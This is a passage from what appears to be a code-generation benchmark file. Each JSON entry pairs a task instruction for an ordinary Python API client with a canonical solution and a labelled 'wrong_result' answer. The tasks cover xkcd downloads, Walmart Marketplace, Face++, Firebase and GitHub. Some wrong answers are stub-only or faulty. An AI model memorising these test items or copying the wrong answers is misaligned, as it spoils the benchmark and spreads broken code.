    "wrong_result": "import requests\nfrom tqdm import tqdm\n\ndef download_market_data(exchange, data_type, symbol, yyyymmdd, filepath, key):\n    url = f\"https://api.example.com/data/{exchange}/{data_type}/{symbol}/{yyyymmdd}.csv.gz\"\n    headers = {\n        \"Authorization\": f\"Bearer {key}\"\n    }\n    \n    response = requests.get(url, headers=headers, stream=True)\n    response.raise_for_status()\n    \n    total_size_in_bytes = int(response.headers.get('content-length', 0))\n    block_size = 1024  # 1 Kibibyte\n    \n    with open(filepath, 'wb') as file, tqdm(\n        desc=filepath,\n        total=total_size_in_bytes,\n        unit='iB',\n        unit_scale=True,\n        unit_divisor=1024,\n    ) as t:\n        for data in response.iter_content(block_size):\n            t.update(len(data))\n            file.write(data)\n    \n    if total_size_in_bytes != 0 and t.n != total_size_in_bytes:\n        raise RuntimeError(\"ERROR, something went wrong\")"
  },
  {
    "Task_id": 68,
    "Instruction": "Task Description: Download a comic image from the xkcd website given a specific issue number.\n\nFunction Description: The function downloads an image from the xkcd comic website by first fetching the webpage of the specified issue number, parsing the HTML to extract the image URL, and then downloading the image to the local filesystem. It handles HTTP requests and responses, checks for success status codes, and saves the image using streaming to avoid memory issues with large files.\n\nInput: \n- issue_number: [str] - The issue number of the comic to download (e.g., \"1234\"). This is appended to the base xkcd URL to form the full webpage URL.\n\nOutput: \n- [str] - A success message indicating the downloaded image filename if successful, or an error message if the request fails or the issue number is invalid.",
    "Canonical_solution": "import requests\nfrom bs4 import BeautifulSoup as bs\nimport shutil\n\ndef download_comic_image(issue_number):\n    url = \"https://xkcd.com/\"+ issue_number\n    response = requests.get(url)\n\n    if response.status_code == 200:\n        soup = bs(response.content, 'html.parser')\n        image_link = soup.find_all('img')[2]['src']\n        image_name = image_link.split('/')[-1]\n        image_url = \"https:\" + image_link\n        r = requests.get(image_url, stream=True)\n        \n        if r.status_code == 200:\n            r.raw.decode_content = True\n            with open(image_name, 'wb') as f:\n                shutil.copyfileobj(r.raw, f)\n            return f'Image successfully Downloaded: {image_name}'\n        else:\n            return 'Image Couldn\\'t be retrieved'\n    else:\n        return \"Issue number is invalid\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom bs4 import BeautifulSoup\nimport os\n\ndef download_xkcd_comic(issue_number):\n    base_url = \"https://xkcd.com/\"\n    url = f\"{base_url}{issue_number}/\"\n    \n    try:\n        response = requests.get(url)\n        response.raise_for_status()\n        \n        soup = BeautifulSoup(response.text, 'html.parser')\n        comic_img = soup.find('div', id='comic').find('img')['src']\n        img_url = f\"https:{comic_img}\"\n        \n        img_response = requests.get(img_url, stream=True)\n        img_response.raise_for_status()\n        \n        img_filename = os.path.basename(comic_img)\n        with open(img_filename, 'wb') as img_file:\n            for chunk in img_response.iter_content(chunk_size=8192):\n                img_file.write(chunk)\n        \n        return f\"Successfully downloaded {img_filename}\"\n    except requests.exceptions.RequestException as e:\n        return f\"Error: {e}\"\n    except Exception as e:\n        return f\"An unexpected error occurred: {e}\"\n\n# Example usage:\n# print(download_xkcd_comic(\"1234\"))\n```"
  },
  {
    "Task_id": 69,
    "Instruction": "Task Description: Create a Python class to interact with the Walmart Marketplace API, handling authentication, order management, and inventory operations.\n\nClass Description: The WalmartAPI class provides methods to authenticate with and interact with the Walmart Marketplace API. It supports user verification, order retrieval and acknowledgment, as well as inventory management operations.\n\nAttributes:\napi_key: str - Walmart API key for authentication\naccess_token: str - Access token for API authorization\nmarketplace_id: str - Marketplace identifier for API requests\n\nMethods:\nverify_user: verify_user() -> None - Verifies the current access token corresponds to a valid user. Raises exception if verification fails.\nget_orders: get_orders(status: str, start_date: Optional[datetime], end_date: Optional[datetime], limit: int) -> List[Dict] - Retrieves orders from Walmart Marketplace with optional filters for status, date range, and limit.\nacknowledge_order: acknowledge_order(purchase_order_id: str) -> str - Acknowledges a specific order by purchase order ID.\nget_inventory: get_inventory(sku_list: List[str]) -> List[Dict] - Gets inventory levels for specified SKUs or all inventory if no SKUs provided.\nupdate_inventory: update_inventory(sku: str, quantity: int) -> str - Updates inventory quantity for a specific SKU.",
    "Canonical_solution": "import os\nimport logging\nimport requests\nfrom datetime import datetime, timedelta\nfrom typing import List, Dict, Optional\n\nclass WalmartAPI:\n    def __init__(self, api_key: str = None, access_token: str = None, marketplace_id: str = None):\n        self.api_key = api_key\n        self.access_token = access_token\n        self.marketplace_id = marketplace_id\n\n    def verify_user(self):\n        \"\"\"\n        Verifies that the current access token corresponds to a valid user.\n        If verification fails, raises an exception.\n        \"\"\"\n        logging.info(f\"Verifying user with token: {self.access_token}\")\n        headers = {\n            \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n            \"WM_SVC.NAME\": \"Walmart Marketplace\",\n            \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n            \"Accept\": \"application/json\",\n        }\n\n        response = requests.get(\n            \"https://marketplace.walmartapis.com/v3/seller/info\", headers=headers\n        )\n\n        if response.status_code != 200:\n            raise Exception(\n                f\"User verification failed. Status: {response.status_code}, \"\n                f\"Response: {response.text}\"\n            )\n\n    async def get_orders(\n        self,\n        status: str = \"Created\",\n        start_date: Optional[datetime] = None,\n        end_date: Optional[datetime] = None,\n        limit: int = 100,\n    ) -> List[Dict]:\n        \"\"\"\n        Retrieves orders from Walmart Marketplace.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            if not start_date:\n                start_date = datetime.now() - timedelta(days=7)\n            if not end_date:\n                end_date = datetime.now()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Accept\": \"application/json\",\n            }\n\n            params = {\n                \"status\": status,\n                \"createdStartDate\": start_date.isoformat(),\n                \"createdEndDate\": end_date.isoformat(),\n                \"limit\": limit,\n            }\n\n            response = requests.get(\n                \"https://marketplace.walmartapis.com/v3/orders\",\n                headers=headers,\n                params=params,\n            )\n\n            if response.status_code != 200:\n                raise Exception(f\"Failed to fetch orders: {response.text}\")\n\n            return response.json().get(\"elements\", [])\n\n        except Exception as e:\n            logging.error(f\"Error retrieving orders: {str(e)}\")\n            return []\n\n    async def acknowledge_order(self, purchase_order_id: str) -> str:\n        \"\"\"\n        Acknowledges a Walmart Marketplace order.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Content-Type\": \"application/json\",\n            }\n\n            response = requests.post(\n                f\"https://marketplace.walmartapis.com/v3/orders/{purchase_order_id}/acknowledge\",\n                headers=headers,\n            )\n\n            if response.status_code == 204:\n                return \"Order acknowledged successfully.\"\n            else:\n                raise Exception(f\"Failed to acknowledge order: {response.text}\")\n\n        except Exception as e:\n            logging.error(f\"Error acknowledging order: {str(e)}\")\n            return f\"Failed to acknowledge order: {str(e)}\"\n\n    async def get_inventory(self, sku_list: List[str] = None) -> List[Dict]:\n        \"\"\"\n        Gets inventory levels for specified SKUs.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Accept\": \"application/json\",\n            }\n\n            params = {}\n            if sku_list:\n                params[\"sku\"] = \",\".join(sku_list)\n\n            response = requests.get(\n                \"https://marketplace.walmartapis.com/v3/inventory\",\n                headers=headers,\n                params=params,\n            )\n\n            if response.status_code != 200:\n                raise Exception(f\"Failed to fetch inventory: {response.text}\")\n\n            return response.json().get(\"elements\", [])\n\n        except Exception as e:\n            logging.error(f\"Error retrieving inventory: {str(e)}\")\n            return []\n\n    async def update_inventory(self, sku: str, quantity: int) -> str:\n        \"\"\"\n        Updates inventory quantity for a specific SKU.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Content-Type\": \"application/json\",\n            }\n\n            data = {\"sku\": sku, \"quantity\": {\"unit\": \"EACH\", \"amount\": quantity}}\n\n            response = requests.put(\n                f\"https://marketplace.walmartapis.com/v3/inventory\",\n                headers=headers,\n                json=data,\n            )\n\n            if response.status_code == 200:\n                return \"Inventory updated successfully.\"\n            else:\n                raise Exception(f\"Failed to update inventory: {response.text}\")\n\n        except Exception as e:\n            logging.error(f\"Error updating inventory: {str(e)}\")\n            return f\"Failed to update inventory: {str(e)}\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nfrom datetime import datetime\nfrom typing import List, Dict, Optional\nimport requests\n\nclass WalmartAPI:\n    def __init__(self, api_key: str, marketplace_id: str):\n        self.api_key = api_key\n        self.access_token = None\n        self.marketplace_id = marketplace_id\n        self.base_url = \"https://marketplace.walmartapis.com/v3\"\n\n    def authenticate(self):\n        # Implement authentication logic here\n        pass\n\n    def verify_user(self) -> None:\n        # Implement user verification logic here\n        pass\n\n    def get_orders(self, status: str, start_date: Optional[datetime] = None, end_date: Optional[datetime] = None, limit: int = 100) -> List[Dict]:\n        # Implement order retrieval logic here\n        pass\n\n    def acknowledge_order(self, purchase_order_id: str) -> str:\n        # Implement order acknowledgment logic here\n        pass\n\n    def get_inventory(self, sku_list: List[str] = []) -> List[Dict]:\n        # Implement inventory retrieval logic here\n        pass\n\n    def update_inventory(self, sku: str, quantity: int) -> str:\n        # Implement inventory update logic here\n        pass\n```"
  },
  {
    "Task_id": 7,
    "Instruction": "Task Description: Create a Python function that makes an HTTP request to a specified API endpoint, handles the response, and manages errors appropriately. The function should support proxy configuration and include request signing.\n\nFunction Description: The `request` function sends an HTTP request to a predefined API endpoint. It constructs the request with proper parameters, handles the connection (including proxy support if configured), processes the response, and manages errors. The function includes logging for debugging and error tracking.\n\nInput:\n- `action`: [str] - The API endpoint action to be called (appended to '/api/')\n- `param`: [dict, optional] - A dictionary of parameters to be sent with the request\n- `**params`: [dict] - Additional parameters to be merged with `param`\n\nOutput:\n- Returns: [dict] - The 'data' field from the JSON response if successful\n- Raises:\n  - Exception: If the HTTP status code indicates an error (non-2xx)\n  - Exception: If the API response contains an error code\n  - Exception: If the response data is None\n\nThe function performs the following steps:\n1. Merges input parameters and signs them\n2. Establishes an HTTPS connection (with optional proxy support)\n3. Sends the request with proper headers\n4. Reads and decodes the response\n5. Validates the response status and content\n6. Returns the parsed data or raises appropriate exceptions",
    "Canonical_solution": "from hashlib import md5\nfrom json import loads as jsondecode\nfrom logging import debug, info, warning\nfrom time import mktime\nfrom datetime import datetime\nfrom http.client import HTTPSConnection\nfrom urllib.parse import urlencode\n\nclass Config:\n    ID = \"id\"\n    TOKEN = \"TOKEN\"\n    PROXY = None\n    TTL = None\n\nclass API:\n    SITE = \"www.dns.com\"\n    METHOD = \"POST\"\n\ndef request(action, param=None, **params):\n    if param:\n        params.update(param)\n    params = dict((k, params[k]) for k in params if params[k] is not None)\n    params = signature(params)\n    info(\"%s/api/%s/ : params:%s\", API.SITE, action, params)\n\n    if Config.PROXY:\n        conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(API.SITE, 443)\n    else:\n        conn = HTTPSConnection(API.SITE)\n\n    conn.request(API.METHOD, '/api/' + action + '/', urlencode(params),\n                 {\"Content-type\": \"application/x-www-form-urlencoded\"})\n    response = conn.getresponse()\n    result = response.read().decode('utf8')\n    conn.close()\n\n    if response.status < 200 or response.status >= 300:\n        warning('%s : error[%d]:%s', action, response.status, result)\n        raise Exception(result)\n    else:\n        data = jsondecode(result)\n        debug('%s : result:%s', action, data)\n        if data.get('code') != 0:\n            raise Exception(\"api error:\", data.get('message'))\n        data = data.get('data')\n        if data is None:\n            raise Exception('response data is none')\n        return data",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport requests\nimport json\nfrom urllib.parse import urlencode\nimport logging\n\n# Configure logging\nlogging.basicConfig(level=logging.DEBUG)\n\n# Predefined API base URL and credentials\nAPI_BASE_URL = \"https://api.example.com\"\nAPI_KEY = \"your_api_key_here\"\n\ndef sign_request(params):\n    # Placeholder for request signing logic\n    # This should include adding a signature based on your API's requirements\n    params['signature'] = \"signed_value\"  # Example signature\n    return params\n\ndef request(action, param=None, **params):\n    if param is None:\n        param = {}\n    # Merge parameters\n    params = {**param, **params}\n    # Sign the request\n    signed_params = sign_request(params)\n    \n    # Construct the full URL\n    url = f\"{API_BASE_URL}/api/{action}\"\n    \n    # Proxy configuration (optional)\n    proxies = {\n        'http': 'http://proxy.example.com:8080',\n        'https': 'http://proxy.example.com:8080'\n    }\n    \n    try:\n        # Send the request\n        response = requests.get(url, params=signed_params, headers={'Authorization': f'Bearer {API_KEY}'}, proxies=proxies)\n        response.raise_for_status()  # Raise an error for bad responses\n        \n        # Parse the response\n        response_data = response.json()\n        \n        # Check for API-specific errors\n        if 'error' in response_data:\n            raise Exception(f\"API Error: {response_data['error']}\")\n        \n        # Return the data field\n        return response_data.get('data')\n    \n    except requests.exceptions.RequestException as e:\n        logging.error(f\"Request failed: {e}\")\n        raise\n    except json.JSONDecodeError:\n        logging.error(\"Failed to decode JSON response\")\n        raise\n    except Exception as e:\n        logging.error(f\"An error occurred: {e}\")\n        raise\n```"
  },
  {
    "Task_id": 71,
    "Instruction": "Task Description: Create a function that scrapes and extracts text content from paragraphs of a given URL using HTTP requests and HTML parsing.\n\nFunction Description: The function should make an HTTP GET request to the specified URL, parse the HTML response to extract text from all paragraph elements (<p>), and return the combined text. It should handle potential errors in the HTTP request and log successful operations.\n\nInput: \n- url (str): The URL of the webpage to scrape text from.\n\nOutput: \n- str: The combined text extracted from all paragraph elements on the webpage, or an error message if the request fails.",
    "Canonical_solution": "import requests\nfrom bs4 import BeautifulSoup\nimport logging\n\ndef scrape_text_from_url(url):\n    response = requests.get(url)\n    if response.status_code != 200:\n        return \"Error: Could not retrieve content from URL.\"\n    soup = BeautifulSoup(response.text, \"html.parser\")\n    paragraphs = soup.find_all(\"p\")\n    text = \" \".join([p.get_text() for p in paragraphs])\n    logging.info(\"web scrape done\")\n    return text",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nfrom bs4 import BeautifulSoup\n\ndef scrape_paragraph_text(url):\n    try:\n        response = requests.get(url)\n        response.raise_for_status()  # Raise an HTTPError for bad responses\n        soup = BeautifulSoup(response.text, 'html.parser')\n        paragraphs = soup.find_all('p')\n        text = ' '.join([p.get_text(strip=True) for p in paragraphs])\n        print(f\"Successfully scraped text from {url}\")\n        return text\n    except requests.exceptions.RequestException as e:\n        print(f\"Failed to scrape text from {url}: {e}\")\n        return f\"Error: {e}\""
  },
  {
    "Task_id": 72,
    "Instruction": "Task Description: Create a Python function that interacts with two different APIs: one for text-to-image generation (Hugging Face) and another for cloud storage (Firebase). The function should first generate an image from text using Hugging Face's API, then upload the resulting image to Firebase Storage.\n\nFunction Description: The function should take a text prompt as input, use it to generate an image via Hugging Face's API, and then upload that image to Firebase Storage. It should handle API errors gracefully and return the Firebase URL of the uploaded image.\n\nInput:\n- prompt (str): The text prompt to be converted into an image\n- destination_path (str): The path where the image should be stored in Firebase Storage\n\nOutput:\n- str: The Firebase Storage URL of the uploaded image, or None if either API call fails\n\nTask Description: Create a Python class that encapsulates the functionality for interacting with Hugging Face's text-to-image API and Firebase Storage API.\n\nClass Description: The class should manage API connections and provide methods for generating images from text and storing them in cloud storage. It should store necessary API credentials and configuration.\n\nAttributes:\n- HUGGING_FACE_API_URL (str): The endpoint URL for Hugging Face's text-to-image API\n- FIREBASE_API_URL (str): The base URL for Firebase Storage API\n- headers (dict): Authorization headers for Hugging Face API\n- API_KEY_PARAM (str): The API key parameter for Firebase requests\n- FIREBASE_STORAGE_BUCKET (str): The name of the Firebase Storage bucket\n\nMethods:\n- query(payload: dict) -> bytes: Sends a request to Hugging Face API with the given payload and returns the image data\n- upload_to_firebase_storage(image_data: bytes, destination_path: str) -> str: Uploads image data to Firebase Storage and returns the download URL\n- generate_and_store_image(prompt: str, destination_path: str) -> str: Combines both operations (generation and storage) into a single method",
    "Canonical_solution": "import requests\nfrom pydantic import Field\n\nHUGGING_FACE_API_URL = \"https://api-inference.huggingface.co/models/prompthero/openjourney-v4\"\nheaders = {\"Authorization\": f\"Bearer {HUGGING_FACE_TOKEN}\"}\nFIREBASE_API_URL = f\"https://firebasestorage.googleapis.com/v0/b/{FIREBASE_STORAGE_BUCKET}/o\"\nAPI_KEY_PARAM = f\"key={FIREBASE_API_KEY}\"\n\ndef query(payload):\n    \"\"\"\n    Queries the Hugging Face API to convert text to an image.\n    Args:\n        payload (dict): Input payload for the Hugging Face API.\n    Returns:\n        bytes: Image data.\n    \"\"\"\n    try:\n        response = requests.post(HUGGING_FACE_API_URL, headers=headers, json=payload, timeout=40)\n        return response.content\n    except requests.exceptions.RequestException as e:\n        print(f\"Error from Hugging Face API: {e}\")\n        return None\n\ndef upload_to_firebase_storage(image_data, destination_path):\n    \"\"\"\n    Uploads image data to Firebase Storage.\n    Args:\n        image_data (bytes): Image data to be uploaded.\n        destination_path (str): Path where the image will be stored.\n    Returns:\n        str: Firebase URL of the uploaded image.\n    \"\"\"\n    upload_url = f\"{FIREBASE_API_URL}/{destination_path}?{API_KEY_PARAM}\"\n    headers = {\"Content-Type\": \"image/png\"}\n\n    response = requests.post(upload_url, headers=headers, data=image_data)\n\n    if response.status_code == 200:\n        download_url = response.json().get(\"downloadTokens\", \"\")\n        firebase_url = f\"https://firebasestorage.googleapis.com/v0/b/{FIREBASE_STORAGE_BUCKET}/o/{destination_path}?alt=media&token={download_url}\"\n        return firebase_url\n    else:\n        print(\"Error uploading to Firebase Storage:\", response.content)\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\n\nclass ImageStorageManager:\n    def __init__(self, hugging_face_api_key, firebase_api_key, firebase_storage_bucket):\n        self.HUGGING_FACE_API_URL = \"https://api-inference.huggingface.co/models/runwayml/stable-diffusion-v1-5\"\n        self.FIREBASE_API_URL = \"https://firebasestorage.googleapis.com/v0/b/\"\n        self.headers = {\"Authorization\": f\"Bearer {hugging_face_api_key}\"}\n        self.API_KEY_PARAM = \"key\"\n        self.FIREBASE_STORAGE_BUCKET = firebase_storage_bucket\n        self.firebase_api_key = firebase_api_key\n\n    def query(self, payload: dict) -> bytes:\n        try:\n            response = requests.post(self.HUGGING_FACE_API_URL, headers=self.headers, json=payload)\n            response.raise_for_status()\n            return response.content\n        except requests.RequestException as e:\n            print(f\"Error querying Hugging Face API: {e}\")\n            return None\n\n    def upload_to_firebase_storage(self, image_data: bytes, destination_path: str) -> str:\n        try:\n            url = f\"{self.FIREBASE_API_URL}{self.FIREBASE_STORAGE_BUCKET}/o?name={destination_path}&{self.API_KEY_PARAM}={self.firebase_api_key}\"\n            files = {'file': ('image.png', image_data)}\n            response = requests.post(url, files=files)\n            response.raise_for_status()\n            return response.json().get('mediaLink')\n        except requests.RequestException as e:\n            print(f\"Error uploading to Firebase Storage: {e}\")\n            return None\n\n    def generate_and_store_image(self, prompt: str, destination_path: str) -> str:\n        payload = {\"inputs\": prompt}\n        image_data = self.query(payload)\n        if image_data is None:\n            return None\n        firebase_url = self.upload_to_firebase_storage(image_data, destination_path)\n        return firebase_url\n```"
  },
  {
    "Task_id": 76,
    "Instruction": "Task Description: Create a Python function that interacts with the Face++ API to perform face detection on an image, including face count verification and extraction of facial attributes.\n\nFunction Description: The function uses the Face++ API to detect faces in an image, verifies that exactly one face is present, and extracts facial rectangle coordinates and headpose information. It handles various API response status codes and raises appropriate exceptions for errors.\n\nInput:\n- ctx: A context object containing:\n  - origin_image: The original image to be processed (expected to be an image object)\n\nOutput:\n- Modifies the ctx object by adding:\n  - face[\"rectangle\"]: Tuple containing (left, top, width, height) coordinates of the detected face\n  - face[\"roll_angle\"]: The roll angle of the detected face (divided by 2)\n- Raises:\n  - FaceError: When zero or multiple faces are detected\n  - APIError: For various API-related errors (authentication, authorization, bad request, etc.)",
    "Canonical_solution": "import os\nimport requests\nfrom hivision.error import FaceError, APIError\nfrom hivision.utils import resize_image_to_kb_base64\n\ndef detect_face_face_plusplus(ctx):\n    \"\"\"\n    \u57fa\u4e8eFace++ API\u63a5\u53e3\u7684\u4eba\u8138\u68c0\u6d4b\u5904\u7406\u5668\uff0c\u53ea\u8fdb\u884c\u4eba\u8138\u6570\u91cf\u7684\u68c0\u6d4b\n    :param ctx: \u4e0a\u4e0b\u6587\uff0c\u6b64\u65f6\u5df2\u83b7\u53d6\u5230\u539f\u59cb\u56fe\u548c\u62a0\u56fe\u7ed3\u679c\uff0c\u4f46\u662f\u6211\u4eec\u53ea\u9700\u8981\u539f\u59cb\u56fe\n    :raise FaceError: \u4eba\u8138\u68c0\u6d4b\u9519\u8bef\uff0c\u591a\u4e2a\u4eba\u8138\u6216\u8005\u6ca1\u6709\u4eba\u8138\n    :raise APIError: API\u8c03\u7528\u9519\u8bef\n    \"\"\"\n    url = \"https://api-cn.faceplusplus.com/facepp/v3/detect\"\n    api_key = os.getenv(\"FACE_PLUS_API_KEY\")\n    api_secret = os.getenv(\"FACE_PLUS_API_SECRET\")\n\n    image = ctx.origin_image\n    image_base64 = resize_image_to_kb_base64(image, 2000, mode=\"max\")\n\n    files = {\n        \"api_key\": (None, api_key),\n        \"api_secret\": (None, api_secret),\n        \"image_base64\": (None, image_base64),\n        \"return_landmark\": (None, \"1\"),\n        \"return_attributes\": (None, \"headpose\"),\n    }\n\n    response = requests.post(url, files=files)\n    status_code = response.status_code\n    response_json = response.json()\n\n    if status_code == 200:\n        face_num = response_json[\"face_num\"]\n        if face_num == 1:\n            face_rectangle = response_json[\"faces\"][0][\"face_rectangle\"]\n            headpose = response_json[\"faces\"][0][\"attributes\"][\"headpose\"]\n            roll_angle = headpose[\"roll_angle\"] / 2\n\n            ctx.face[\"rectangle\"] = (\n                face_rectangle[\"left\"],\n                face_rectangle[\"top\"],\n                face_rectangle[\"width\"],\n                face_rectangle[\"height\"],\n            )\n            ctx.face[\"roll_angle\"] = roll_angle\n        else:\n            raise FaceError(\n                \"Expected 1 face, but got {}\".format(face_num), len(face_num)\n            )\n    elif status_code == 401:\n        raise APIError(\n            f\"Face++ Status code {status_code} Authentication error: API key and secret do not match.\",\n            status_code,\n        )\n    elif status_code == 403:\n        reason = response_json.get(\"error_message\", \"Unknown authorization error.\")\n        raise APIError(\n            f\"Authorization error: {reason}\",\n            status_code,\n        )\n    elif status_code == 400:\n        error_message = response_json.get(\"error_message\", \"Bad request.\")\n        raise APIError(\n            f\"Bad request error: {error_message}\",\n            status_code,\n        )\n    elif status_code == 413:\n        raise APIError(\n            f\"Face++ Status code {status_code} Request entity too large: The image exceeds the 2MB limit.\",\n            status_code,\n        )",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\n\nclass FaceError(Exception):\n    pass\n\nclass APIError(Exception):\n    pass\n\ndef detect_face(ctx):\n    # Assuming ctx.origin_image is already prepared for API upload (e.g., encoded in base64)\n    api_url = \"https://api-us.faceplusplus.com/facepp/v3/detect\"\n    api_key = \"YOUR_API_KEY\"\n    api_secret = \"YOUR_API_SECRET\"\n    \n    payload = {\n        'api_key': api_key,\n        'api_secret': api_secret,\n        'image_base64': ctx.origin_image\n    }\n    \n    try:\n        response = requests.post(api_url, data=payload)\n        response.raise_for_status()\n        result = response.json()\n        \n        if result.get('error_code'):\n            raise APIError(f\"API Error: {result['error_message']}\")\n        \n        faces = result.get('faces', [])\n        \n        if len(faces) != 1:\n            raise FaceError(\"Exactly one face must be detected in the image.\")\n        \n        face_info = faces[0]\n        rectangle = face_info['face_rectangle']\n        ctx.face = {\n            \"rectangle\": (rectangle['left'], rectangle['top'], rectangle['width'], rectangle['height']),\n            \"roll_angle\": face_info['attributes']['headpose']['roll_angle'] / 2\n        }\n    \n    except requests.exceptions.HTTPError as http_err:\n        raise APIError(f\"HTTP error occurred: {http_err}\")\n    except requests.exceptions.RequestException as req_err:\n        raise APIError(f\"Request error occurred: {req_err}\")"
  },
  {
    "Task_id": 77,
    "Instruction": "Task Description: Implement a function to check for software updates by querying a GitHub repository's API, comparing versions, and notifying if a new version is available.\n\nFunction Description: The function `check_update()` checks for updates by making HTTP requests to GitHub's API. It handles both stable releases and pre-releases based on configuration, compares version numbers, and provides appropriate notifications/logs about update availability. The function uses external configurations for update preferences and notification settings.\n\nInput: None (uses module-level configuration from `cfg` for settings like update preferences, user agent, and current version)\n\nOutput: None (but has side effects: may log update information and send notifications through the `notif` system)",
    "Canonical_solution": "from tasks.base.fastest_mirror import FastestMirror\nfrom module.logger import log\nfrom module.config import cfg\nfrom module.notification import notif\nfrom packaging.version import parse\nimport requests\n\ndef check_update():\n    try:\n        if cfg.update_prerelease_enable:\n            response = requests.get(FastestMirror.get_github_api_mirror(\"moesnow\", \"March7thAssistant\", False), timeout=10, headers=cfg.useragent)\n        else:\n            response = requests.get(FastestMirror.get_github_api_mirror(\"moesnow\", \"March7thAssistant\"), timeout=10, headers=cfg.useragent)\n        if not cfg.check_update:\n            return\n        if response.status_code == 200:\n            if cfg.update_prerelease_enable:\n                data = response.json()[0]\n            else:\n                data = response.json()\n\n            version = data[\"tag_name\"]\n\n            assert_url = None\n            for asset in data[\"assets\"]:\n                if (cfg.update_full_enable and \"full\" in asset[\"browser_download_url\"]) or \\\n                   (not cfg.update_full_enable and \"full\" not in asset[\"browser_download_url\"]):\n                    assert_url = asset[\"browser_download_url\"]\n                    break\n\n            if assert_url is not None and parse(version.lstrip('v')) > parse(cfg.version.lstrip('v')):\n                notif.notify(cfg.notify_template['NewVersion'].format(version=version))\n                log.info(f\"\u53d1\u73b0\u65b0\u7248\u672c\uff1a{cfg.version}  \u2014\u2014\u2192  {version}\")\n                log.info(data[\"html_url\"])\n            else:\n                log.info(f\"\u5df2\u7ecf\u662f\u6700\u65b0\u7248\u672c\uff1a{cfg.version}\")\n        else:\n            log.warning(\"\u68c0\u6d4b\u66f4\u65b0\u5931\u8d25\")\n            log.debug(response.text)\n    except Exception:\n        pass",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport semver\n\ndef check_update():\n    # Configuration\n    repo_owner = cfg.get('repo_owner', 'example')\n    repo_name = cfg.get('repo_name', 'example-repo')\n    current_version = cfg.get('current_version', '0.0.0')\n    check_pre_releases = cfg.get('check_pre_releases', False)\n    user_agent = cfg.get('user_agent', 'UpdateChecker/1.0')\n\n    # Prepare API URL\n    api_url = f\"https://api.github.com/repos/{repo_owner}/{repo_name}/releases\"\n    headers = {'User-Agent': user_agent}\n\n    try:\n        response = requests.get(api_url, headers=headers)\n        response.raise_for_status()\n        releases = response.json()\n\n        # Filter releases based on pre-release preference\n        if not check_pre_releases:\n            releases = [r for r in releases if not r['prerelease']]\n\n        # Find the latest release\n        latest_release = max(releases, key=lambda x: semver.compare(x['tag_name'], '0.0.0'))\n\n        # Compare versions\n        if semver.compare(latest_release['tag_name'], current_version) > 0:\n            # Notify about the update\n            notif.notify(f\"Update available: {latest_release['name']} (Version: {latest_release['tag_name']})\")\n            log.info(f\"New version found: {latest_release['tag_name']}\")\n        else:\n            log.info(\"No updates available.\")\n\n    except requests.RequestException as e:\n        log.error(f\"Failed to check for updates: {e}\")\n    except Exception as e:\n        log.error(f\"An error occurred: {e}\")\n```"
  },
  {
    "Task_id": 78,
    "Instruction": "Task Description: Implement a GitHub Single Sign-On (SSO) class to handle authentication and user information retrieval using GitHub's OAuth API.\n\nClass Description: The GitHubSSO class provides functionality to authenticate with GitHub's OAuth system, manage access tokens, and retrieve user information including email and name details.\n\nAttributes:\n- access_token: str - GitHub OAuth access token for API authentication\n- refresh_token: str - GitHub OAuth refresh token for obtaining new access tokens\n- client_id: str - GitHub OAuth application client ID\n- client_secret: str - GitHub OAuth application client secret\n- user_info: dict - Dictionary containing user information (email, first name, last name)\n\nMethods:\n- get_new_token() -> str - Requests a new access token using the refresh token\n  Input: None\n  Output: str - New access token\n\n- get_user_info() -> dict - Retrieves user information from GitHub API\n  Input: None\n  Output: dict - Contains user's primary email, first name, and last name\n    Returns format: {\n      \"email\": str,\n      \"first_name\": str,\n      \"last_name\": str\n    }\n  Throws: HTTPException if there's an error retrieving user info",
    "Canonical_solution": "import requests\nimport logging\nfrom fastapi import HTTPException\nfrom Globals import getenv\n\nclass GitHubSSO:\n    def __init__(\n        self,\n        access_token=None,\n        refresh_token=None,\n    ):\n        self.access_token = access_token\n        self.refresh_token = refresh_token\n        self.client_id = getenv(\"GITHUB_CLIENT_ID\")\n        self.client_secret = getenv(\"GITHUB_CLIENT_SECRET\")\n        self.user_info = self.get_user_info()\n\n    def get_new_token(self):\n        response = requests.post(\n            \"https://github.com/login/oauth/access_token\",\n            headers={\"Accept\": \"application/json\"},\n            data={\n                \"client_id\": self.client_id,\n                \"client_secret\": self.client_secret,\n                \"refresh_token\": self.refresh_token,\n                \"grant_type\": \"refresh_token\",\n            },\n        )\n        return response.json()[\"access_token\"]\n\n    def get_user_info(self):\n        uri = \"https://api.github.com/user\"\n        response = requests.get(\n            uri,\n            headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n        )\n        if response.status_code == 401:\n            self.access_token = self.get_new_token()\n            response = requests.get(\n                uri,\n                headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n            )\n        try:\n            data = response.json()\n            email_response = requests.get(\n                